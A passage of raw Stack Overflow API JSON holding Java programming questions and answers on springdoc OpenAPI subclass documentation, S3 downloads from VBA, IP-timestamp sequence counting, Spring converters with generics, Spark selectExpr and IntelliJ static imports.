if(states.get(i).getName().equals(minDeath)) \n            {\n                 minDeathNum=states.get(i).getDeaths();\n            }\n            \n            \n            \n        }\n        System.out.println(&quot;State With Most Cases: &quot;+maxCase+&quot;, &quot;+maxCaseNum+&quot; Cases&quot;);\n        System.out.println(&quot;State With Least Cases: &quot;+minCase+&quot;, &quot;+minCaseNum+&quot; Cases&quot;);\n        System.out.println(&quot;State With Most Deaths: &quot;+maxDeath+&quot;, &quot;+maxDeathNum+&quot; Deaths&quot;);\n        System.out.println(&quot;State With Least Deaths: &quot;+minDeath+&quot;, &quot;+minDeathNum+&quot; Deaths&quot;);            \n        System.out.println(&quot;Total US Cases: &quot;+totCase);\n        System.out.println(&quot;Total US Deaths: &quot;+totDeath);\n        System.out.println(&quot;------------------------------------&quot;);\n        System.out.println(&quot;AVG State Cases: &quot;+totCase/55);\n        System.out.println(&quot;AVG State Deaths: &quot;+totDeath/55);\n        \n        for(int i=0; i&lt;states.size();i++) \n        {\n\n            if(states.get(i).getName().equals(&quot;New Jersey&quot;)) \n            {\n                states.get(i).displayStats();\n            }\n            \n            \n        }\n        \n        \n    }   //end of main\n} //end of class\n\n</code></pre>\n<pre><code>\npublic class State \n{\n    \n        private String stateName,timeZone;\n        private int population;\n        private double density;\n        \n        \n        //default constructor\n        public State()\n        {\n            \n        }\n        \n        //constructor\n        public State(String theName) \n        {\n            stateName=theName;\n        }\n        \n        //name getter+setter\n        public String getName() \n        {\n            return stateName;\n        }\n        \n        public void setName(String theName) \n        {\n            stateName=theName;\n        }\n    \n}\n\n</code></pre>\n"},{"tags":["java","springdoc-openapi-ui"],"owner":{"account_id":1888781,"reputation":2007,"user_id":1707427,"display_name":"S&#246;ren"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":40,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1683728028,"creation_date":1683728028,"question_id":76219476,"body_markdown":"I have a spring boot (2.7.11) application, where the entities are part of an inheritance tree:\r\n```java\r\n@Getter @Setter @SuperBuilder\r\npublic class Foo {\r\n    private String foo;\r\n}\r\n```\r\n\r\n```java\r\n@Getter @Setter @SuperBuilder\r\npublic class Bar extends Foo {\r\n    private String bar;\r\n}\r\n```\r\n\r\n```java\r\n@Getter @Setter @SuperBuilder\r\npublic class Baz extends Foo {\r\n    private String baz;\r\n}\r\n```\r\n\r\nMy controller returns a list auf said entities:\r\n```java\r\n@RestController\r\n@RequestMapping(&quot;/&quot;)\r\npublic class FooController {\r\n    @GetMapping(&quot;/&quot;)\r\n    @Operation(operationId = &quot;getFoos&quot;, description = &quot;get some Foos&quot;)\r\n    public List&lt;Foo&gt;getFoos() {\r\n        return List.of(\r\n                Bar.builder().foo(&quot;a&quot;).bar(&quot;b&quot;).build(),\r\n                Baz.builder().foo(&quot;x&quot;).baz(&quot;y&quot;).build()\r\n        );\r\n    }\r\n}\r\n```\r\n\r\nJackson is fine serializing this:\r\n```\r\n$ curl --silent http://localhost:8080/ | jq . -\r\n[\r\n  {\r\n    &quot;foo&quot;: &quot;a&quot;,\r\n    &quot;bar&quot;: &quot;b&quot;\r\n  },\r\n  {\r\n    &quot;foo&quot;: &quot;x&quot;,\r\n    &quot;baz&quot;: &quot;y&quot;\r\n  }\r\n]\r\n```\r\n\r\nHowever, the api documentation generated by &#39;org.springdoc:springdoc-openapi-ui:1.7.0&#39; only contains the superclass, not the subclasses:\r\n\r\n```\r\n$ curl --silent http://localhost:8080/v3/api-docs/ | jq . -\r\n{\r\n  &quot;openapi&quot;: &quot;3.0.1&quot;,\r\n  &quot;info&quot;: {\r\n    &quot;title&quot;: &quot;OpenAPI definition&quot;,\r\n    &quot;version&quot;: &quot;v0&quot;\r\n  },\r\n  &quot;servers&quot;: [\r\n    {\r\n      &quot;url&quot;: &quot;http://localhost:8080/&quot;,\r\n      &quot;description&quot;: &quot;Generated server url&quot;\r\n    }\r\n  ],\r\n  &quot;paths&quot;: {\r\n    &quot;/&quot;: {\r\n      &quot;get&quot;: {\r\n        &quot;tags&quot;: [\r\n          &quot;foo-controller&quot;\r\n        ],\r\n        &quot;description&quot;: &quot;get some Foos&quot;,\r\n        &quot;operationId&quot;: &quot;getFoos&quot;,\r\n        &quot;responses&quot;: {\r\n          &quot;200&quot;: {\r\n            &quot;description&quot;: &quot;OK&quot;,\r\n            &quot;content&quot;: {\r\n              &quot;*/*&quot;: {\r\n                &quot;schema&quot;: {\r\n                  &quot;type&quot;: &quot;array&quot;,\r\n                  &quot;items&quot;: {\r\n                    &quot;$ref&quot;: &quot;#/components/schemas/Foo&quot;\r\n                  }\r\n                }\r\n              }\r\n            }\r\n          }\r\n        }\r\n      }\r\n    }\r\n  },\r\n  &quot;components&quot;: {\r\n    &quot;schemas&quot;: {\r\n      &quot;Foo&quot;: {\r\n        &quot;type&quot;: &quot;object&quot;,\r\n        &quot;properties&quot;: {\r\n          &quot;foo&quot;: {\r\n            &quot;type&quot;: &quot;string&quot;\r\n          }\r\n        }\r\n      }\r\n    }\r\n  }\r\n}\r\n```\r\n\r\nWhat can I do to have the child classes included? (Later on, the api is used to autogenerate javascript, which is then missing the types)","title":"Document childclasses with OpenAPI","body":"<p>I have a spring boot (2.7.11) application, where the entities are part of an inheritance tree:</p>\n<pre class=\"lang-java prettyprint-override\"><code>@Getter @Setter @SuperBuilder\npublic class Foo {\n    private String foo;\n}\n</code></pre>\n<pre class=\"lang-java prettyprint-override\"><code>@Getter @Setter @SuperBuilder\npublic class Bar extends Foo {\n    private String bar;\n}\n</code></pre>\n<pre class=\"lang-java prettyprint-override\"><code>@Getter @Setter @SuperBuilder\npublic class Baz extends Foo {\n    private String baz;\n}\n</code></pre>\n<p>My controller returns a list auf said entities:</p>\n<pre class=\"lang-java prettyprint-override\"><code>@RestController\n@RequestMapping(&quot;/&quot;)\npublic class FooController {\n    @GetMapping(&quot;/&quot;)\n    @Operation(operationId = &quot;getFoos&quot;, description = &quot;get some Foos&quot;)\n    public List&lt;Foo&gt;getFoos() {\n        return List.of(\n                Bar.builder().foo(&quot;a&quot;).bar(&quot;b&quot;).build(),\n                Baz.builder().foo(&quot;x&quot;).baz(&quot;y&quot;).build()\n        );\n    }\n}\n</code></pre>\n<p>Jackson is fine serializing this:</p>\n<pre><code>$ curl --silent http://localhost:8080/ | jq . -\n[\n  {\n    &quot;foo&quot;: &quot;a&quot;,\n    &quot;bar&quot;: &quot;b&quot;\n  },\n  {\n    &quot;foo&quot;: &quot;x&quot;,\n    &quot;baz&quot;: &quot;y&quot;\n  }\n]\n</code></pre>\n<p>However, the api documentation generated by 'org.springdoc:springdoc-openapi-ui:1.7.0' only contains the superclass, not the subclasses:</p>\n<pre><code>$ curl --silent http://localhost:8080/v3/api-docs/ | jq . -\n{\n  &quot;openapi&quot;: &quot;3.0.1&quot;,\n  &quot;info&quot;: {\n    &quot;title&quot;: &quot;OpenAPI definition&quot;,\n    &quot;version&quot;: &quot;v0&quot;\n  },\n  &quot;servers&quot;: [\n    {\n      &quot;url&quot;: &quot;http://localhost:8080/&quot;,\n      &quot;description&quot;: &quot;Generated server url&quot;\n    }\n  ],\n  &quot;paths&quot;: {\n    &quot;/&quot;: {\n      &quot;get&quot;: {\n        &quot;tags&quot;: [\n          &quot;foo-controller&quot;\n        ],\n        &quot;description&quot;: &quot;get some Foos&quot;,\n        &quot;operationId&quot;: &quot;getFoos&quot;,\n        &quot;responses&quot;: {\n          &quot;200&quot;: {\n            &quot;description&quot;: &quot;OK&quot;,\n            &quot;content&quot;: {\n              &quot;*/*&quot;: {\n                &quot;schema&quot;: {\n                  &quot;type&quot;: &quot;array&quot;,\n                  &quot;items&quot;: {\n                    &quot;$ref&quot;: &quot;#/components/schemas/Foo&quot;\n                  }\n                }\n              }\n            }\n          }\n        }\n      }\n    }\n  },\n  &quot;components&quot;: {\n    &quot;schemas&quot;: {\n      &quot;Foo&quot;: {\n        &quot;type&quot;: &quot;object&quot;,\n        &quot;properties&quot;: {\n          &quot;foo&quot;: {\n            &quot;type&quot;: &quot;string&quot;\n          }\n        }\n      }\n    }\n  }\n}\n</code></pre>\n<p>What can I do to have the child classes included? (Later on, the api is used to autogenerate javascript, which is then missing the types)</p>\n"},{"tags":["java","vba","amazon-web-services","rest","amazon-s3"],"comments":[{"owner":{"account_id":303420,"reputation":10129,"user_id":2378643,"display_name":"Anon Coward"},"score":0,"creation_date":1683730333,"post_id":76219461,"comment_id":134412078,"body_markdown":"This is possible, but not trivial.  You&#39;ll need an AWS Secret and Key, and recreate the logic to [sign a URL](https://docs.aws.amazon.com/AmazonS3/latest/API/sigv4-query-string-auth.html) in VBA.  [This answer might be a starting point](https://stackoverflow.com/questions/74372578/aws-s3-generate-presigned-url-in-visual-basic)","body":"This is possible, but not trivial.  You&#39;ll need an AWS Secret and Key, and recreate the logic to <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/API/sigv4-query-string-auth.html\" rel=\"nofollow noreferrer\">sign a URL</a> in VBA.  <a href=\"https://stackoverflow.com/questions/74372578/aws-s3-generate-presigned-url-in-visual-basic\">This answer might be a starting point</a>"}],"owner":{"account_id":17197306,"reputation":119,"user_id":12449753,"display_name":"w97802"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":71,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1683727912,"creation_date":1683727912,"question_id":76219461,"body_markdown":"I see from this post (https://stackoverflow.com/questions/4760957/can-you-integrate-amazon-93-or-cloud-fileg-or-smiliar-with-ms-accegg-vba) that, to download s3 file, we can: \r\n\r\n - “if your content is private you&#39;ll need to create a signed url, You could create a web service on your web server to generate these signed urls&quot;\r\n\r\n\r\nSo, it seems like I can create a rest endpoint in Java S3 client to download files with functions similar to:\r\n```\r\npublic String downloadBase64 (String bucket, String objectName) {\r\n  return Base64.getEncoder().encodeToString(IOUtils.toByteArray(client.getObject(bucket,objectName).getObjectContent()));\r\n\r\n\r\npublic String getDownloadUrl (String objectName, long expiresInMinutes){\r\n   return get DownloadUrl (defaultBucketName, objectName, expiresInMinutes);\r\n\r\npublic String getDownloadUrl (String bucket, String objectName, long expiresInMinutes)\r\ntry{\r\n   return client. generatePresignedUrl (bucket, objectName, DateUtil.plusHours (new Date (), 2)) . toURI(). toString () ;\r\n} catch (Exception e) {\r\n   throw new TechnicalException(&quot;S3 DOWNLOAD ERROR&quot;, e):\r\n}\r\n```\r\n\r\nHowever, I have 2 questions:\r\n\r\n 1. It seem like the `downloadBase64` is the way to download the file content as string, then can we treat `getDownloadUrl` as a link which will trigger download automatically when we click it? Is it possible to download file as it is? e.g. if it&#39;s csv then we download it as csv\r\n 2. While `downloadBase64` &amp; `getDownloadUrl` are implemented in Java, is it feasible to implement this purely from VBA? (getting the file directly from s3).  Is it even possible to get the file directly from s3 via a REST call from VBA? \r\n\r\nThank you so much in advance.","title":"Download S3 files only with VBA REST call","body":"<p>I see from this post (<a href=\"https://stackoverflow.com/questions/4760957/can-you-integrate-amazon-93-or-cloud-fileg-or-smiliar-with-ms-accegg-vba\">Can you integrate Amazon S3 (or Cloud Files or Smiliar) with MS Access (VBA)?</a>) that, to download s3 file, we can:</p>\n<ul>\n<li>“if your content is private you'll need to create a signed url, You could create a web service on your web server to generate these signed urls&quot;</li>\n</ul>\n<p>So, it seems like I can create a rest endpoint in Java S3 client to download files with functions similar to:</p>\n<pre><code>public String downloadBase64 (String bucket, String objectName) {\n  return Base64.getEncoder().encodeToString(IOUtils.toByteArray(client.getObject(bucket,objectName).getObjectContent()));\n\n\npublic String getDownloadUrl (String objectName, long expiresInMinutes){\n   return get DownloadUrl (defaultBucketName, objectName, expiresInMinutes);\n\npublic String getDownloadUrl (String bucket, String objectName, long expiresInMinutes)\ntry{\n   return client. generatePresignedUrl (bucket, objectName, DateUtil.plusHours (new Date (), 2)) . toURI(). toString () ;\n} catch (Exception e) {\n   throw new TechnicalException(&quot;S3 DOWNLOAD ERROR&quot;, e):\n}\n</code></pre>\n<p>However, I have 2 questions:</p>\n<ol>\n<li>It seem like the <code>downloadBase64</code> is the way to download the file content as string, then can we treat <code>getDownloadUrl</code> as a link which will trigger download automatically when we click it? Is it possible to download file as it is? e.g. if it's csv then we download it as csv</li>\n<li>While <code>downloadBase64</code> &amp; <code>getDownloadUrl</code> are implemented in Java, is it feasible to implement this purely from VBA? (getting the file directly from s3).  Is it even possible to get the file directly from s3 via a REST call from VBA?</li>\n</ol>\n<p>Thank you so much in advance.</p>\n"},{"tags":["java"],"answers":[{"tags":[],"owner":{"account_id":20160,"reputation":4164,"user_id":47883,"accept_rate":58,"display_name":"lbrandao"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1683727651,"creation_date":1683727651,"answer_id":76219413,"question_id":76219289,"body_markdown":"What does entry.getKey() return? You seem to be ignoring the fact that you can have different sequences for the same IP. Take your example, you have two sequences for the IP 1.2.3.4, but in your code if getKey returns the same then you will be only counting it as one sequence.","title":"Count sequences of data rows given condition","body":"<p>What does entry.getKey() return? You seem to be ignoring the fact that you can have different sequences for the same IP. Take your example, you have two sequences for the IP 1.2.3.4, but in your code if getKey returns the same then you will be only counting it as one sequence.</p>\n"}],"owner":{"account_id":16467655,"reputation":13,"user_id":11897432,"display_name":"Admin_PCNGroup"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":51,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":1,"score":0,"last_activity_date":1683727651,"creation_date":1683726967,"question_id":76219289,"body_markdown":"I have a file were rows are of the form `IPAddress:Timestamp` (IP Address is in the usuak IPv4 notation, timestamp in seconds from the epoch). \r\n\r\nI&#39;d like to count how many times the following event happens: it begins a sequence of rows such that for every two rows that have the same IP address, the difference between their timestamp is `&lt; 240`. \r\n\r\nLet me explain further:\r\n\r\nGiven \r\n```\r\n1.2.3.4:0\r\n1.2.3.4:50\r\n1.2.3.4:60\r\n1.2.3.4:70\r\n5.6.7.8:80\r\n1.2.3.4:1500\r\n1.2.3.4:1600\r\n```\r\nI should get the result `2`, because rows 1,2,3,4 form such a sequence, and rows 6,7 form another one.\r\n\r\nThis is what I tried (using Java, let Row be a class that summarizes the data of a row in the file):\r\n```java\r\nint count = 0;\r\n\t\tHashMap&lt;String, Long&gt; t = new HashMap&lt;&gt;();\r\n\r\n\t\tfor (Map.Entry&lt;String, List&lt;Row&gt;&gt; entry : IP_MAP.entrySet()) {\r\n\t\t\tList&lt;Row&gt; list = entry.getValue();\r\n\t\t\tt.put(entry.getKey(), 0L);\r\n\r\n\t\t\tfor (int i = 0; i &lt; list.size() - 1; i++) {\r\n\t\t\t\tlong d = list.get(i + 1).getTimestamp() - list.get(i).getTimestamp();\r\n\t\t\t\tif (d &gt; 0 &amp;&amp; d &lt; FOUR_MINUTES &amp;&amp; list.get(i).getTimestamp() - t.get(entry.getKey()) &gt; FOUR_MINUTES) {\r\n\r\n\t\t\t\t\tcount++;\r\n\t\t\t\t}\r\n\t\t\t\tt.put(entry.getKey(), list.get(i).getTimestamp());\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\treturn count;\r\n}\r\n```\r\nWhere the timestamp is stored as a `long`, IP address as a `String` and `FOUR_MINUTES` is a long that is equal to `240`. (240 seconds = 4 mins).\r\n\r\nThe problem is that my result is always too low.\r\n\r\nWhat could be the problem in my code?\r\nThanks.","title":"Count sequences of data rows given condition","body":"<p>I have a file were rows are of the form <code>IPAddress:Timestamp</code> (IP Address is in the usuak IPv4 notation, timestamp in seconds from the epoch).</p>\n<p>I'd like to count how many times the following event happens: it begins a sequence of rows such that for every two rows that have the same IP address, the difference between their timestamp is <code>&lt; 240</code>.</p>\n<p>Let me explain further:</p>\n<p>Given</p>\n<pre><code>1.2.3.4:0\n1.2.3.4:50\n1.2.3.4:60\n1.2.3.4:70\n5.6.7.8:80\n1.2.3.4:1500\n1.2.3.4:1600\n</code></pre>\n<p>I should get the result <code>2</code>, because rows 1,2,3,4 form such a sequence, and rows 6,7 form another one.</p>\n<p>This is what I tried (using Java, let Row be a class that summarizes the data of a row in the file):</p>\n<pre class=\"lang-java prettyprint-override\"><code>int count = 0;\n        HashMap&lt;String, Long&gt; t = new HashMap&lt;&gt;();\n\n        for (Map.Entry&lt;String, List&lt;Row&gt;&gt; entry : IP_MAP.entrySet()) {\n            List&lt;Row&gt; list = entry.getValue();\n            t.put(entry.getKey(), 0L);\n\n            for (int i = 0; i &lt; list.size() - 1; i++) {\n                long d = list.get(i + 1).getTimestamp() - list.get(i).getTimestamp();\n                if (d &gt; 0 &amp;&amp; d &lt; FOUR_MINUTES &amp;&amp; list.get(i).getTimestamp() - t.get(entry.getKey()) &gt; FOUR_MINUTES) {\n\n                    count++;\n                }\n                t.put(entry.getKey(), list.get(i).getTimestamp());\n            }\n        }\n\n        return count;\n}\n</code></pre>\n<p>Where the timestamp is stored as a <code>long</code>, IP address as a <code>String</code> and <code>FOUR_MINUTES</code> is a long that is equal to <code>240</code>. (240 seconds = 4 mins).</p>\n<p>The problem is that my result is always too low.</p>\n<p>What could be the problem in my code?\nThanks.</p>\n"},{"tags":["java","spring","generics","converters"],"owner":{"account_id":19781651,"reputation":58,"user_id":16127057,"display_name":"Zakhar"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":62,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1683727538,"creation_date":1683727538,"question_id":76219394,"body_markdown":"I have a simple controller \r\n\r\n    @GetMapping(&quot;/Project&quot;)\r\n    public Page&lt;Project&gt; getProjects(@ModelAttribute(&quot;params&quot;) SortGeneric&lt;Sort&gt; pageParams) {\r\n        return service.getProjects(pageParams);\r\n    }\r\n\r\nParameter placeholder:\r\n\r\n    @Data\r\n    public class SortGeneric&lt;T&gt; {\r\n        protected List&lt;T&gt; sortBy = new ArrayList&lt;&gt;();\r\n        // other fields...\r\n    }\r\n\r\nSort is an enum: \r\n\r\n    @Getter\r\n    @AllArgsConstructor \r\n    enum Sort {\r\n        REVISION(&quot;revision&quot;, &quot;number&quot;),\r\n        FILE_NAME(&quot;fileName&quot;, &quot;fileName&quot;)\r\n\r\n        public static Sort convert(String value) {\r\n             //omitted\r\n        }\r\n    }\r\n\r\nOf course, I created and registered a converter for the enum in WebMvcConfigurer\r\n\r\n    public class SortConverter implements Converter&lt;String, Sort&gt; {\r\n        @Override\r\n        public Sort convert(String source) {\r\n            return Sort.convert(source);\r\n        }\r\n    }\r\n\r\n    public class WebMvcConfig implements WebMvcConfigurer {\r\n        public void addFormatters(FormatterRegistry registry) {\r\n            registry.addConverter(new SortConverter());\r\n        }\r\n    }\r\n\r\nWhen I call the controller, sortGeneric.sortBy has **Strings** inside, not **Sort** and SortConverter is not called\r\n\r\nI can workaround it by creating a wrapper for SortGeneric&lt;&gt; \r\n\r\n    public class Wrapper extends SortGeneric&lt;Sort&gt;{}\r\n\r\nand receive it in the controller\r\n\r\n    @GetMapping(&quot;/Project&quot;)\r\n    public Page&lt;Project&gt; getProjects(@ModelAttribute(&quot;params&quot;) Wrapper pageParams) {\r\n        return service.getProjects(pageParams);\r\n    }\r\n    \r\nThen it will work as expected, sortGeneric.sortBy contains **Sort** and the converter was called. I can not understand why the wrapper helped. Is there a way to avoid creating wrappers?","title":"Why custom converter is not called for HTTP params with generic?","body":"<p>I have a simple controller</p>\n<pre><code>@GetMapping(&quot;/Project&quot;)\npublic Page&lt;Project&gt; getProjects(@ModelAttribute(&quot;params&quot;) SortGeneric&lt;Sort&gt; pageParams) {\n    return service.getProjects(pageParams);\n}\n</code></pre>\n<p>Parameter placeholder:</p>\n<pre><code>@Data\npublic class SortGeneric&lt;T&gt; {\n    protected List&lt;T&gt; sortBy = new ArrayList&lt;&gt;();\n    // other fields...\n}\n</code></pre>\n<p>Sort is an enum:</p>\n<pre><code>@Getter\n@AllArgsConstructor \nenum Sort {\n    REVISION(&quot;revision&quot;, &quot;number&quot;),\n    FILE_NAME(&quot;fileName&quot;, &quot;fileName&quot;)\n\n    public static Sort convert(String value) {\n         //omitted\n    }\n}\n</code></pre>\n<p>Of course, I created and registered a converter for the enum in WebMvcConfigurer</p>\n<pre><code>public class SortConverter implements Converter&lt;String, Sort&gt; {\n    @Override\n    public Sort convert(String source) {\n        return Sort.convert(source);\n    }\n}\n\npublic class WebMvcConfig implements WebMvcConfigurer {\n    public void addFormatters(FormatterRegistry registry) {\n        registry.addConverter(new SortConverter());\n    }\n}\n</code></pre>\n<p>When I call the controller, sortGeneric.sortBy has <strong>Strings</strong> inside, not <strong>Sort</strong> and SortConverter is not called</p>\n<p>I can workaround it by creating a wrapper for SortGeneric&lt;&gt;</p>\n<pre><code>public class Wrapper extends SortGeneric&lt;Sort&gt;{}\n</code></pre>\n<p>and receive it in the controller</p>\n<pre><code>@GetMapping(&quot;/Project&quot;)\npublic Page&lt;Project&gt; getProjects(@ModelAttribute(&quot;params&quot;) Wrapper pageParams) {\n    return service.getProjects(pageParams);\n}\n</code></pre>\n<p>Then it will work as expected, sortGeneric.sortBy contains <strong>Sort</strong> and the converter was called. I can not understand why the wrapper helped. Is there a way to avoid creating wrappers?</p>\n"},{"tags":["java","apache-spark"],"comments":[{"owner":{"account_id":16326637,"reputation":11,"user_id":11791046,"display_name":"minyan-xiao"},"score":0,"creation_date":1683641995,"post_id":76210194,"comment_id":134395708,"body_markdown":"the dataset schema is composed of fields such as &quot;provinceCode&quot;,&quot;cpCode&quot;,&quot;psId&quot;, mkString(&quot;,&quot;) method will cause &quot;provinceCode,cpCode,psId&quot; which is not exist in the schema","body":"the dataset schema is composed of fields such as &quot;provinceCode&quot;,&quot;cpCode&quot;,&quot;psId&quot;, mkString(&quot;,&quot;) method will cause &quot;provinceCode,cpCode,psId&quot; which is not exist in the schema"}],"answers":[{"tags":[],"owner":{"account_id":9727861,"reputation":2565,"user_id":7214091,"display_name":"Gast&#243;n Schabas"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1683646243,"creation_date":1683646243,"answer_id":76211024,"question_id":76210194,"body_markdown":"I just tried a Hello world in my local using `spark-sql_2.13-3.4.0` with `JDK 11` and I was able to call the method `dataframe.selectExpr(javaArray)` like you are doing in the example provided.\r\n\r\nMy `pom.xml`\r\n\r\n      &lt;artifactId&gt;hello-world-java-spark&lt;/artifactId&gt;\r\n      &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;\r\n      \r\n      &lt;properties&gt;\r\n        &lt;maven.compiler.source&gt;11&lt;/maven.compiler.source&gt;\r\n        &lt;maven.compiler.target&gt;11&lt;/maven.compiler.target&gt;\r\n      &lt;/properties&gt;\r\n    \r\n      &lt;dependencies&gt;\r\n    \r\n        &lt;dependency&gt;\r\n          &lt;groupId&gt;org.apache.spark&lt;/groupId&gt;\r\n          &lt;artifactId&gt;spark-sql_2.13&lt;/artifactId&gt;\r\n          &lt;version&gt;3.4.0&lt;/version&gt;\r\n        &lt;/dependency&gt;\r\n    \r\n      &lt;/dependencies&gt;\r\n\r\nI have a json file with the following content\r\n\r\n    {&quot;name&quot;:&quot;Michael&quot;}\r\n    {&quot;name&quot;:&quot;Andy&quot;, &quot;age&quot;:30}\r\n    {&quot;name&quot;:&quot;Justin&quot;, &quot;age&quot;:19}\r\n\r\nMy hello world class\r\n\r\n    import org.apache.spark.api.java.function.ForeachFunction;\r\n    import org.apache.spark.sql.Dataset;\r\n    import org.apache.spark.sql.Row;\r\n    import org.apache.spark.sql.SparkSession;\r\n    \r\n    public class HelloWorldJavaSpark {\r\n    \r\n        public static void main(String[] args) {\r\n            SparkSession sparkSession = SparkSession.builder()\r\n                    .appName(&quot;Customer Aggregation pipeline&quot;)\r\n                    .master(&quot;local&quot;)\r\n                    .getOrCreate();\r\n    \r\n            Dataset&lt;Row&gt; dataFrame = sparkSession.read().json(&quot;src/main/resources/people.json&quot;);\r\n    \r\n            dataFrame.printSchema();\r\n    \r\n            String[] columns = {&quot;name&quot;, &quot;age&quot;}; // java array\r\n            dataFrame\r\n                .selectExpr(columns) // java array being used as param\r\n                .foreach((ForeachFunction) x -&gt; System.out.println(x));\r\n    \r\n        }\r\n    \r\n    }\r\n\r\nI was able to execute it as a java app from IntelliJ and also using `spark-submit`\r\n\r\nmvn command to package\r\n\r\n    mvn package\r\n\r\nOnce the jar is generated I executed spark-submit like this\r\n\r\n    spark-submit --class &quot;HelloWorldJavaSpark&quot; target/hello-world-java-spark-1.0-SNAPSHOT.jar\r\n\r\nAnd this was the output\r\n\r\n    [Michael,null]\r\n    [Andy,30]\r\n    [Justin,19]\r\n\r\nIf your context is not similar (spark version, jdk, maybe operative system, etc), please provide more details","title":"How to convert Java Array or List to Scala String*","body":"<p>I just tried a Hello world in my local using <code>spark-sql_2.13-3.4.0</code> with <code>JDK 11</code> and I was able to call the method <code>dataframe.selectExpr(javaArray)</code> like you are doing in the example provided.</p>\n<p>My <code>pom.xml</code></p>\n<pre><code>  &lt;artifactId&gt;hello-world-java-spark&lt;/artifactId&gt;\n  &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;\n  \n  &lt;properties&gt;\n    &lt;maven.compiler.source&gt;11&lt;/maven.compiler.source&gt;\n    &lt;maven.compiler.target&gt;11&lt;/maven.compiler.target&gt;\n  &lt;/properties&gt;\n\n  &lt;dependencies&gt;\n\n    &lt;dependency&gt;\n      &lt;groupId&gt;org.apache.spark&lt;/groupId&gt;\n      &lt;artifactId&gt;spark-sql_2.13&lt;/artifactId&gt;\n      &lt;version&gt;3.4.0&lt;/version&gt;\n    &lt;/dependency&gt;\n\n  &lt;/dependencies&gt;\n</code></pre>\n<p>I have a json file with the following content</p>\n<pre><code>{&quot;name&quot;:&quot;Michael&quot;}\n{&quot;name&quot;:&quot;Andy&quot;, &quot;age&quot;:30}\n{&quot;name&quot;:&quot;Justin&quot;, &quot;age&quot;:19}\n</code></pre>\n<p>My hello world class</p>\n<pre><code>import org.apache.spark.api.java.function.ForeachFunction;\nimport org.apache.spark.sql.Dataset;\nimport org.apache.spark.sql.Row;\nimport org.apache.spark.sql.SparkSession;\n\npublic class HelloWorldJavaSpark {\n\n    public static void main(String[] args) {\n        SparkSession sparkSession = SparkSession.builder()\n                .appName(&quot;Customer Aggregation pipeline&quot;)\n                .master(&quot;local&quot;)\n                .getOrCreate();\n\n        Dataset&lt;Row&gt; dataFrame = sparkSession.read().json(&quot;src/main/resources/people.json&quot;);\n\n        dataFrame.printSchema();\n\n        String[] columns = {&quot;name&quot;, &quot;age&quot;}; // java array\n        dataFrame\n            .selectExpr(columns) // java array being used as param\n            .foreach((ForeachFunction) x -&gt; System.out.println(x));\n\n    }\n\n}\n</code></pre>\n<p>I was able to execute it as a java app from IntelliJ and also using <code>spark-submit</code></p>\n<p>mvn command to package</p>\n<pre><code>mvn package\n</code></pre>\n<p>Once the jar is generated I executed spark-submit like this</p>\n<pre><code>spark-submit --class &quot;HelloWorldJavaSpark&quot; target/hello-world-java-spark-1.0-SNAPSHOT.jar\n</code></pre>\n<p>And this was the output</p>\n<pre><code>[Michael,null]\n[Andy,30]\n[Justin,19]\n</code></pre>\n<p>If your context is not similar (spark version, jdk, maybe operative system, etc), please provide more details</p>\n"}],"owner":{"account_id":16326637,"reputation":11,"user_id":11791046,"display_name":"minyan-xiao"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":55,"favorite_count":0,"down_vote_count":2,"up_vote_count":0,"answer_count":1,"score":-2,"last_activity_date":1683727516,"creation_date":1683641022,"question_id":76210194,"body_markdown":"Here I have a spark java project, but when I use dataset API such as selectExpr(String*) method to process my data, I need to convert the parameters in the form of Java Array or List to Scala String*, if I use Java Array as parameters in the method selectExpr(String*), the method would treat the Java Array as a String which cause failure.\r\nfor example, in my code:\r\n```\r\nString[] selectFields = new String[]{&quot;provinceCode&quot;,&quot;cpCode&quot;,&quot;psId&quot;}\r\ndatasets.selectExpr(selectFields).........\r\n```\r\nAfter I submit my Job, the error occurs:\r\n```\r\nmismatched input &#39;,&#39; expecting &lt;EOF&gt;(line 1, pos 12)\r\n\r\n== SQL ==\r\nprovinceCode,contentTypeCode,psId\r\n```\r\nI really need your help, thank you ","title":"How to convert Java Array or List to Scala String*","body":"<p>Here I have a spark java project, but when I use dataset API such as selectExpr(String*) method to process my data, I need to convert the parameters in the form of Java Array or List to Scala String*, if I use Java Array as parameters in the method selectExpr(String*), the method would treat the Java Array as a String which cause failure.\nfor example, in my code:</p>\n<pre><code>String[] selectFields = new String[]{&quot;provinceCode&quot;,&quot;cpCode&quot;,&quot;psId&quot;}\ndatasets.selectExpr(selectFields).........\n</code></pre>\n<p>After I submit my Job, the error occurs:</p>\n<pre><code>mismatched input ',' expecting &lt;EOF&gt;(line 1, pos 12)\n\n== SQL ==\nprovinceCode,contentTypeCode,psId\n</code></pre>\n<p>I really need your help, thank you</p>\n"},{"tags":["java","intellij-idea"],"answers":[{"tags":[],"owner":{"account_id":112379,"reputation":38375,"user_id":296452,"accept_rate":42,"display_name":"Andreas Wederbrand"},"down_vote_count":1,"up_vote_count":8,"is_accepted":false,"score":7,"last_activity_date":1291809975,"creation_date":1291809975,"answer_id":4387209,"question_id":4387134,"body_markdown":"Just do the reference once, then put the caret on the class name (ie Math), press alt+enter and choose &quot;add on demand static import for &#39;java.lang.Math&#39;. Intellij will add\r\n\r\n    import static java.lang.Math.*;\r\n\r\nto the top of the file.\r\n","title":"IntelliJ Static Import Completion","body":"<p>Just do the reference once, then put the caret 